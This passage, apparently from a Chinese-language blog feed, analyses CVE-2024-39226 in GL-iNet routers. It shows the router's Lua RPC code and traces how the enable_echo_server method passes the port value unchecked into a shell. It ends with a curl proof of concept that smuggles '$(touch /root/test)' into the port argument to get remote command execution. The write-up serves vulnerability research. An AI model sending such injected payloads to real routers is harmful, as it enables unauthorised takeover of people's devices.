class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> funs</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">local</span> fn <span class=\"token operator\">=</span> objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span> <span class=\"token keyword\">and</span> objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>method<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> fn  <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">fn</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>DEBUG<span class=\"token punctuation\">,</span> <span class=\"token string\">\"call C: '\"</span><span class=\"token punctuation\">,</span> object<span class=\"token punctuation\">,</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token comment\">-- 查看 /usr/lib/oui-httpd/rpc/ 目录下是二进制 s2s.so 文件，</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token comment\">-- 无法直接加载，则通过 glc_call 调用 /cgi-bin/glc 执行 C 程序实现的 RPC 方法。</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">capture</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/cgi-bin/glc\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        method <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>HTTP_POST<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        body <span class=\"token operator\">=</span> cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            object <span class=\"token operator\">=</span> object<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            method <span class=\"token operator\">=</span> method<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            args <span class=\"token operator\">=</span> args <span class=\"token keyword\">or</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>status <span class=\"token operator\">~=</span> ngx<span class=\"token punctuation\">.</span>HTTP_OK <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> M<span class=\"token punctuation\">.</span>ERROR_CODE_INTERNAL_ERROR <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token keyword\">local</span> body <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>body</pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token keyword\">local</span> code <span class=\"token operator\">=</span> <span class=\"token function\">tonumber</span><span class=\"token punctuation\">(</span>body<span class=\"token punctuation\">:</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(-?%d+)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token operator\">~=</span> M<span class=\"token punctuation\">.</span>ERROR_CODE_NONE <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">local</span> err_msg <span class=\"token operator\">=</span> body<span class=\"token punctuation\">:</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d+ (.+)\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> err_msg <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>ERR<span class=\"token punctuation\">,</span> err_msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token keyword\">return</span> code</pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">local</span> msg <span class=\"token operator\">=</span> body<span class=\"token punctuation\">:</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d+ (.*)\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">return</span> cjson<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr></table></figure><p>接着跟进 /www/cgi-bin/glc 文件</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320203904419.png\" alt=\"image-20250320203904419\"></p>\n<p>通过了解 dlopen 可知了解到 /usr/lib/oui-httpd/rpc 是加载动态库的函数</p>\n<blockquote>\n<p>snprintf(s, 0x80u, “%s/%<span class=\"exturl\" data-url=\"aHR0cDovL3Muc28=\">s.so</span>”, “/usr/lib/oui-httpd/rpc”, v30);<br>\nv10 = dlopen(s, 2);</p>\n</blockquote>\n<p>所以可以这样理解，通过我们输入的 json 数据去解析，然后通过 dlopen 加载动态库进行操作。</p>\n<p>所以通过 POC，他是调用 <code>/usr/lib/oui-httpd/rpc</code>  目录下的 s2s.so 动态库。通过 ida 分析，找到这个 <code>enable_echo_server</code>  函数</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250321183309440.png\" alt=\"image-20250321183309440\"></p>\n<p>在处理端口时，由于对于端口并没有很严格的限制，所以可以进行命令注入</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250321182951476.png\" alt=\"image-20250321182951476\"></p>\n<h3 id=\"4进一步研究\"><a class=\"markdownIt-Anchor\" href=\"#4进一步研究\">#</a> 4. 进一步研究</h3>\n<p>通过上述可以发现，只能在本地实现命令注入执行的操作有点鸡肋了，而通过 /rpc 路径只能实现一条本地攻击的操作链，如果我们话 /cgi-rpc 这个路径应该会有一个意想不到的效果。所以下面分析一下 /cgi-rpc 这条路径下 glc 文件，去实现远程命令执行</p>\n<p>首先简单的看一些保存接口的文件</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250321174436958.png\" alt=\"image-20250321174436958\"></p>\n<p>而已经知道了 /cgi-bin 路径下存放以下文件</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250321174733185.png\" alt=\"image-20250321174733185\"></p>\n<p>所以当我们直接调用 /cgi-bin/glc，发起一个内部的 HTTP POST 请求，去处理 Json 数据，并去传递属性，方法和参数信息，就无需限制本地或远程请求。</p>\n<p>所以也就有了下面的 POC</p>\n<blockquote>\n<p>curl 198.162.122.130/cgi-bin/glc -d ‘{ “object”:“s2s”,  “method”:“enable_echo_server”, “args”:{“port”: “7 $(touch /root/test)”}}’</p>\n</blockquote>\n<blockquote>\n<p>参考连接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMyMjQvIzE=\">https://paper.seebug.org/3224/#1</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55eGZ6ZWR1LmNvbS9hcnRpY2xlLzExNjAw\">http://www.yxfzedu.com/article/11600</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wZXJzb25hbC1yZWFkLmNuOjMwMDAvIy8=\">http://www.personal-read.cn:3000/#/</span></p>\n</blockquote>\n",
            "tags": [
                "IOT"
            ]
        }
    ]
}